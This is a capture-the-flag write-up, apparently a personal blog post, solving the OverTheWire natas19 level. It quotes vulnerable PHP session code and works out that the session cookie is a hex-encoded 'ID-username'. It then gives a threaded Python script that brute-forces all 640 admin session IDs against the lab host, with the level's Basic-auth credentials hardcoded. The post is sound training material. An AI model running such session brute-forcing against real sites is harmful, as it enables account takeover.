Title: Solution for wargame natas19
Date: 2015-09-15 10:59
Author: Nikolai Tschacher
Category: Php
Tags: Python, Wargames, Php, Security
Slug: solution-for-wargame-natas19
Status: published

Hi everyone
-----------

I am still trying to solve wargames on
[overthewire](http://overthewire.org). Level 19 proofed to be very
similar to level 18, where server side code looks something like the
following:

    :::php
    <?

    $maxid = 640; // 640 should be enough for everyone

    function isValidAdminLogin() { /* {{{ */
        if($_REQUEST["username"] == "admin") {
        /* This method of authentication appears to be unsafe and has been disabled for now. */
            //return 1;
        }

        return 0;
    }
    /* }}} */
    function isValidID($id) { /* {{{ */
        return is_numeric($id);
    }
    /* }}} */
    function createID($user) { /* {{{ */
        global $maxid;
        return rand(1, $maxid);
    }
    /* }}} */
    function debug($msg) { /* {{{ */
        if(array_key_exists("debug", $_GET)) {
            print "DEBUG: $msg";
        }
    }
    /* }}} */
    function my_session_start() { /* {{{ */
        if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
            if(!session_start()) {
                debug("Session start failed");
                return false;
            } else {
                debug("Session start ok");
                if(!array_key_exists("admin", $_SESSION)) {
                    debug("Session was old: admin flag set");
                    $_SESSION["admin"] = 0; // backwards compatible, secure
                }
                return true;
            }
        }

        return false;
    }
    /* }}} */
    function print_credentials() { /* {{{ */
        if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
            print "You are an admin. The credentials for the next level are:";
            print "Username: natas19n";
            print "Password: ";  
        } else {  
            print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";  
        }  
    }  
    /* }}} */

    $showform = true;  
    if(my_session_start()) {  
        print_credentials();  
        $showform = false;  
    } else {  
        if(array_key_exists("username", $_REQUEST) &&
            array_key_exists("password", $_REQUEST)) {  
                session_id(createID($_REQUEST["username"]));  
                session_start();  
                $_SESSION["admin"] = isValidAdminLogin();  
                debug("New session started");  
                $showform = false;  
                print_credentials();  
        }  
    }

    if($showform) {  
    ?>

    Please login with your admin account to retrieve credentials for
    natas19.

    <form action="index.php" method="POST">
    Username: <input name="username">  
      
    Password: <input name="password">  
      
    <input type="submit" value="Login"></input>  

    </form>
    <? } ?>

Assuming register_globals are off in the php.ini, we cannot really
inject some values to alter the logic of the code. Furthermore
`isValidAdminLogin()` always returns 0 and never 1, which is our aim.
But we immediately see that admin cookies are generated in a fixed,
small range:  

` function createID($user) { /* {{{ */     global $maxid; // maxid = 640     return rand(1, $maxid); }`

So we can just try brute forcing all cookies from 1 to 640 and we will
soon be admin.

Now level19 has a very similar code, but the cookie is generated
slightly more complex: First I tried some login attempts with different username/password
combinations:

` blabla:blabla ->    PHPSESSID=3235392d 626c61 626c61; path=/; HttpOnly blublu:blublu ->    PHPSESSID=3436382d 626c75 626c75; path=/; HttpOnly admin:AAAAAAAAAAAA ->   PHPSESSID=3538322d 61646d696e; path=/; HttpOnly`

We see that the last bytes seem to look like hex values. We can decode
this with python:

` ''.join([chr(i) for i in (0x62, 0x6c, 0x61)]) == 'bla' ''.join([chr(i) for i in (0x61, 0x64, 0x6d, 0x69, 0x6e)]) == 'admin'`

Assuming the valid ID's are still in the range 1-640, I need to figure
out where the id is hidden in the cookie. Seems like the username ist
just appended at the end of the cookie as ascii string. So we need to
set it to '61646d696e' for admin. The first three bytes are probably the
ID, because the ascii values are all numbers.

Overall cookie format:  
` NUM NUM NUM HYPHEN/- USERNAME`

Examples without ASCII encoding:  
` 123-admin 001-admin 012-admin 640-admin`

The solution to crack the code:

    :::python
    #!/usr/bin/python

    """
    blabla:blabla ->        PHPSESSID=3235392d 626c61 626c61; path=/; HttpOnly
    blublu:blublu ->        PHPSESSID=3436382d 626c75 626c75; path=/; HttpOnly
    admin:AAAAAAAAAAAA ->   PHPSESSID=3538322d 61646d696e; path=/; HttpOnly

    We see that the last bytes seem to look like hex values:

    ''.join([chr(i) for i in (0x62, 0x6c, 0x61)]) == 'bla'
    ''.join([chr(i) for i in (0x61, 0x64, 0x6d, 0x69, 0x6e)]) == 'admin'

    Assuming the valid ID's are still in the range 1-640, I need to figure 
    out where the id is hidden in the cookie. Seems like the username ist just 
    appended at the end of the cookie as ascii string. So we need to set it to 
    '61646d696e' for admin. The first three bytes are probably the ID, because
    the ascii values are all numbers.

    Format:

    NUM NUM NUM HYPHEN/- USERNAME

    Examples without ASCII encoding:

    123-admin
    001-admin
    012-admin
    640-admin
    """

    import threading
    import requests
    import binascii

    DEBUG = True

    class Bruter(threading.Thread):

        username = 'admin'
        url = 'http://natas19.natas.labs.overthewire.org/index.php'
        headers = {
            'Authorization': 'Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==',
        }

        def __init__(self):
            super(Bruter, self).__init__()
            self.sids = []

        def stoa(self, value):
            return binascii.hexlify(str(value))

        def run(self):
            for id in self.sids:
                session_id = 'PHPSESSID=' + self.stoa(str(id).zfill(3)) + self.stoa('-') + self.stoa(self.username)
                self.headers['Cookie'] = session_id
                response = requests.get(self.url, headers=self.headers).text

                if DEBUG:
                    print('[i] Requesting with sid {}'.format(session_id))

                if 'You are logged in as a regular user.' not in response:
                    print('[!] Got something: ' + session_id)
                    print(response)


    def main():
        # lets spawn 10 threads
        threads = [Bruter() for i in range(10)]

        for sid in range(1, 641):
            threads[sid%10].sids.append(sid)

        for t in threads:
            t.start()

        for t in threads:
            t.join()


    if __name__ == '__main__':
        main()
